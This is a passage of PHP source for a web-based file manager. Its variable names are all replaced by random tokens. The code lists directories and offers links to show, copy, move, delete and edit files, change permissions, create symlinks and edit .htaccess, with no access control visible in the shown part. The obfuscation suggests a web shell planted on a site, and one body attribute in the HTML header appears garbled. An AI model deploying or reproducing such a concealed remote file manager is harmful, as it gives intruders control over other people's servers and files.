'; if ($spa3ecf0['is_link']) { echo "\t\t<td bgcolor=\"#FFFFFF\" align=\"center\"><img src=\"{$spa5bde5}?imageid=14\" width=\"17\" height=\"13\"></td>\n"; echo "\t\t<td{$sp506bba} bgcolor=\"#FFFFFF\">"; if ($spa3ecf0['is_dir']) { echo '[ '; } echo $spa3ecf0['filename']; if ($spa3ecf0['is_dir']) { echo ' ]'; } echo ' -&gt; '; if ($spa3ecf0['is_dir']) { echo '[ '; if ($spa3ecf0['is_readable']) { echo "<a href=\"{$spa5bde5}?dir=" . urlencode($spa3ecf0['readlink']) . "{$sp0992ce}\">"; } echo htmlentities($spa3ecf0['readlink']); if ($spa3ecf0['is_readable']) { echo '</a>'; } echo ' ]'; } else { if (dirname($spa3ecf0['readlink']) != '.') { if ($spa3ecf0['is_readable']) { echo "<a href=\"{$spa5bde5}?dir=" . urlencode(dirname($spa3ecf0['readlink'])) . "{$sp0992ce}\">"; } echo htmlentities(dirname($spa3ecf0['readlink'])) . '/'; if ($spa3ecf0['is_readable']) { echo '</a>'; } } if (strlen(basename($spa3ecf0['readlink'])) != 0) { if ($spa3ecf0['is_file'] && $spa3ecf0['is_readable']) { echo "<a href=\"{$spa5bde5}?show=" . urlencode($spa3ecf0['readlink']) . "{$sp0992ce}\">"; } echo htmlentities(basename($spa3ecf0['readlink'])); if ($spa3ecf0['is_file'] && $spa3ecf0['is_readable']) { echo '</a>'; } } if ($spa3ecf0['is_file'] && is_script($spa3ecf0['readlink'])) { echo " <a href=\"{$spa5bde5}?showh=" . urlencode($spa3ecf0['readlink']) . "{$sp0992ce}\">*</a>"; } } echo '</td>
'; } elseif ($spa3ecf0['is_dir']) { echo "\t\t<td bgcolor=\"#FFFFFF\" align=\"center\"><img src=\"{$spa5bde5}?imageid=15\" width=\"17\" height=\"13\"></td>\n"; echo "\t\t<td{$sp506bba} bgcolor=\"#FFFFFF\">[ "; if ($spa3ecf0['is_readable']) { echo "<a href=\"{$spa5bde5}?dir=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">"; } echo htmlentities($spa3ecf0['filename']); if ($spa3ecf0['is_readable']) { echo '</a>'; } echo ' ]</td>
'; } else { echo "\t\t<td bgcolor=\"#FFFFFF\" align=\"center\"><img src=\"{$spa5bde5}?imageid="; if (substr($spa3ecf0['filename'], 0, 1) == '.') { echo '13'; } else { echo '12'; } echo '" width="17" height="13"></td>
'; echo '		<td'; if (substr($spa3ecf0['permission'], 0, 1) != '-') { echo $sp506bba; } echo ' bgcolor="#FFFFFF">'; if ($spa3ecf0['is_readable'] && $spa3ecf0['is_file']) { echo "<a href=\"{$spa5bde5}?show=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">"; } echo htmlentities($spa3ecf0['filename']); if ($spa3ecf0['is_readable'] && $spa3ecf0['is_file']) { echo '</a>'; } if ($spa3ecf0['is_file'] && is_script($spa3ecf0['filename'])) { echo " <a href=\"{$spa5bde5}?showh=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">*</a>"; } echo '</td>
'; if ($sp64e32a['showsize'] && $spa3ecf0['is_file']) { echo '		<td bgcolor="#FFFFFF" align="right" nowrap>'; if ($spa3ecf0['is_file']) { echo "{$spa3ecf0['size']} B"; } echo '</td>
'; } } echo '		<td bgcolor="#FFFFFF" class="perm">'; if ($spca6b76 == $spa3ecf0['owner'] && !$spa3ecf0['is_link']) { echo "<a href=\"{$spa5bde5}?permission=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">"; } echo $spa3ecf0['permission']; if ($spca6b76 == $spa3ecf0['owner'] && !$spa3ecf0['is_link']) { echo '</a>'; } echo '</td>
'; $sp0581a1 = $spa3ecf0['ownername'] == NULL ? $spa3ecf0['owner'] : $spa3ecf0['ownername']; $spbaefbe = $spa3ecf0['groupname'] == NULL ? $spa3ecf0['group'] : $spa3ecf0['groupname']; echo '		<td bgcolor="#FFFFFF">' . $sp0581a1 . '</td>
'; echo '		<td bgcolor="#FFFFFF">' . $spbaefbe . '</td>
'; $sp224638 = "<a href=\"{$spa5bde5}?symlinktarget=" . urlencode($spa25e24 . $spa3ecf0['filename']) . "{$sp0992ce}\">{$sp6b23c0['createsymlink']}</a> | "; if ($spa3ecf0['filename'] != '.' && $spa3ecf0['filename'] != '..') { if ($spa3ecf0['is_readable'] && $spa3ecf0['is_file']) { $sp224638 .= "<a href=\"{$spa5bde5}?cpy=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">{$sp6b23c0['copy']}</a> | "; } if ($spca6b76 == $spa3ecf0['owner']) { $sp224638 .= "<a href=\"{$spa5bde5}?move=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">{$sp6b23c0['move']}</a> | "; $sp224638 .= "<a href=\"{$spa5bde5}?delete=" . urlencode($spa25e24 . $spa3ecf0['filename']) . "{$sp0992ce}\">{$sp6b23c0['delete']}</a> | "; } if ($spa3ecf0['is_writable'] && $spa3ecf0['is_file']) { $sp224638 .= "<a href=\"{$spa5bde5}?edit=" . urlencode($spa3ecf0['fullfilename']) . "{$sp0992ce}\">{$sp6b23c0['edit']}</a> | "; } } if ($spa3ecf0['is_dir'] && @is_file($spa3ecf0['fullfilename'] . '.htaccess') && @is_writable($spa3ecf0['fullfilename'] . '.htaccess')) { $sp224638 .= "<a href=\"{$spa5bde5}?edit=" . urlencode($spa3ecf0['fullfilename']) . '.htaccess' . "{$sp0992ce}\">{$sp6b23c0['configure']}</a> | "; } if (!empty($sp224638)) { $sp224638 = substr($sp224638, 0, strlen($sp224638) - 3); } else { $sp224638 = '&nbsp;'; } echo "\t\t<td bgcolor=\"#FFFFFF\" nowrap>{$sp224638}</td>\n"; echo '	</tr>
'; } ?>
	</table>
	</td></tr></table>
	</p>
<?php  return; } function sortfiles($sp9f4c7d, $sp946414, $sp685417) { $sp9f4c7d = sortfield($sp9f4c7d, $sp946414, $sp685417, 0, sizeof($sp9f4c7d) - 1); if ($sp946414 != 'filename') { $spabe083 = $sp9f4c7d[0][$sp946414]; $sp3b6e1b = 0; for ($sp6c3e91 = 1; $sp6c3e91 < sizeof($sp9f4c7d); $sp6c3e91++) { if ($spabe083 != $sp9f4c7d[$sp6c3e91][$sp946414]) { if ($sp3b6e1b != $sp6c3e91 - 1) { $sp9f4c7d = sortfield($sp9f4c7d, 'filename', false, $sp3b6e1b, $sp6c3e91 - 1); } $sp3b6e1b = $sp6c3e91; } $spabe083 = $sp9f4c7d[$sp6c3e91][$sp946414]; } if ($sp3b6e1b < $sp6c3e91 - 1) { $sp9f4c7d = sortfield($sp9f4c7d, 'filename', false, $sp3b6e1b, $sp6c3e91 - 1); } } return $sp9f4c7d; } function octtostr($sp9dace2) { if (($sp9dace2 & 49152) === 49152) { $spb06e63 = 's'; } elseif (($sp9dace2 & 16384) === 16384) { $spb06e63 = 'd'; } elseif (($sp9dace2 & 40960) === 40960) { $spb06e63 = 'l'; } elseif (($sp9dace2 & 32768) === 32768) { $spb06e63 = '-'; } elseif (($sp9dace2 & 24576) === 24576) { $spb06e63 = 'b'; } elseif (($sp9dace2 & 8192) === 8192) { $spb06e63 = 'c'; } elseif (($sp9dace2 & 4096) === 4096) { $spb06e63 = 'p'; } else { $spb06e63 = '?'; } $sp0581a1 = $sp9dace2 & 256 ? 'r' : '-'; $sp0581a1 .= $sp9dace2 & 128 ? 'w' : '-'; if ($sp9dace2 & 2048) { $sp0581a1 .= $sp9dace2 & 64 ? 's' : 'S'; } else { $sp0581a1 .= $sp9dace2 & 64 ? 'x' : '-'; } $spbaefbe = $sp9dace2 & 32 ? 'r' : '-'; $spbaefbe .= $sp9dace2 & 16 ? 'w' : '-'; if ($sp9dace2 & 1024) { $spbaefbe .= $sp9dace2 & 8 ? 's' : 'S'; } else { $spbaefbe .= $sp9dace2 & 8 ? 'x' : '-'; } $spf3f824 = $sp9dace2 & 4 ? 'r' : '-'; $spf3f824 .= $sp9dace2 & 2 ? 'w' : '-'; if ($sp9dace2 & 512) { $spf3f824 .= $sp9dace2 & 1 ? 't' : 'T'; } else { $spf3f824 .= $sp9dace2 & 1 ? 'x' : '-'; } return $spb06e63 . $sp0581a1 . $spbaefbe . $spf3f824; } function sortfield($spb5262f, $sp1de0f6, $sp685417, $spb078ec, $sp78ca58) { $spb99780 = $spb5262f[(int) (($spb078ec + $sp78ca58) / 2)][$sp1de0f6]; $sp028b47 = $spb078ec; $spd6dd63 = $sp78ca58; while ($sp028b47 <= $spd6dd63) { if ($sp685417) { while ($sp028b47 < $sp78ca58 && $spb5262f[$sp028b47][$sp1de0f6] > $spb99780) { $sp028b47++; } while ($spd6dd63 > $spb078ec && $spb5262f[$spd6dd63][$sp1de0f6] < $spb99780) { $spd6dd63--; } } else { while ($sp028b47 < $sp78ca58 && $spb5262f[$sp028b47][$sp1de0f6] < $spb99780) { $sp028b47++; } while ($spd6dd63 > $spb078ec && $spb5262f[$spd6dd63][$sp1de0f6] > $spb99780) { $spd6dd63--; } } if ($sp028b47 < $spd6dd63) { $sped1c3a = $spb5262f[$spd6dd63]; $spb5262f[$spd6dd63] = $spb5262f[$sp028b47]; $spb5262f[$sp028b47] = $sped1c3a; $spd6dd63--; $sp028b47++; } else { $sp028b47++; } } if ($spd6dd63 > $spb078ec) { $spb5262f = sortfield($spb5262f, $sp1de0f6, $sp685417, $spb078ec, $spd6dd63); } if ($spd6dd63 + 1 < $sp78ca58) { $spb5262f = sortfield($spb5262f, $sp1de0f6, $sp685417, $spd6dd63 + 1, $sp78ca58); } return $spb5262f; } function buildphrase($sp336fe2, $sp6ff357) { if (!is_array($sp336fe2)) { $sp336fe2 = array($sp336fe2); } $sp06a78c = ''; $sp6de926 = ' '; for ($sp6c3e91 = 0; $sp6c3e91 < strlen($sp6ff357); $sp6c3e91++) { $spd8b229 = substr($sp6ff357, $sp6c3e91, 1); if ((int) $spd8b229 > 0 && (int) $spd8b229 <= count($sp336fe2) && $sp6de926 == ' ') { $sp06a78c .= $sp336fe2[(int) $spd8b229 - 1]; } else { $sp06a78c .= $spd8b229; } $sp6de926 = $spd8b229; } return $sp06a78c; } function html_header($spd2ab61) { global $spa5bde5; global $spf785f6, $spdfbf8e, $spab9636; ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<html>
<head>
	<title><?php  echo "{$spa5bde5} - {$spd2ab61}"; ?>
</title>
	<style type="text/css">
	<!--
		td { font-family: sans-serif; font-size: 10pt; }
		a:link, a:visited, a:active { text-decoration: none; color: #000088; }
		a:hover { text-decoration: underline; color: #000088; }
		.perm { font-family: monospace; font-size: 10pt; }
	-->
	</style>
<?php  if (isset($_REQUEST['edit']) && !isset($_POST['save']) && basename($sp575f63 = $_REQUEST['edit']) == '.htaccess') { $spa3ecf0 = dirname($sp575f63) . '/.htpasswd'; ?>
	<script type="text/javascript" language="JavaScript">
	<!--
	function autheinf () {
		document.f.content.value += "Authtype Basic\nAuthName \"Restricted Directory\"\n";
		document.f.content.value += "AuthUserFile <?php  echo htmlentities($spa3ecf0); ?>
\n";
		document.f.content.value += "Require valid-user";
	}
	//-->
	</script>
<?php  } ?>
</head>
<body bgcolor="#FFFFFF"<?php  if ($spab9636 && !empty($_SESSION['tree'])) { echo " '{$spa5bde5}?frame=treeview&dir=" . urlencode($_SESSION['dir']) . '&' . SID . '&pmru=' . time() . '#' . urlencode($_SESSION['dir']) . '\'))"'; } ?>
>
<?php  if (!empty($spf785f6)) { perror($spf785f6); } if (!empty($spdfbf8e)) { pnotice($spdfbf8e); } return; } function html_footer($sp295ddd = TRUE) { global $spa5bde5, $sp6b23c0; if ($sp295ddd) { ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4"><tr><td bgcolor="#EEEEEE">
	<a href="<?php  echo "{$spa5bde5}?id=" . $_REQUEST['id']; ?>
"><?php  echo $sp6b23c0['back']; ?>
</a>
	</td></tr></table>
	</td></tr></table>
	</p>
<?php  } ?>
</body>
</html>
<?php  return; } function perror($sp6ff357) { ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4"><tr><td bgcolor="#FFCCCC">
	<?php  echo "{$sp6ff357}\n"; ?>
	</td></tr></table>
	</td></tr></table>
	</p>
<?php  return; } function pnotice($sp6ff357) { ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4"><tr><td bgcolor="#CCFFCC">
	<?php  echo "{$sp6ff357}\n"; ?>
	</td></tr></table>
	</td></tr></table>
	</p>
<?php  return; }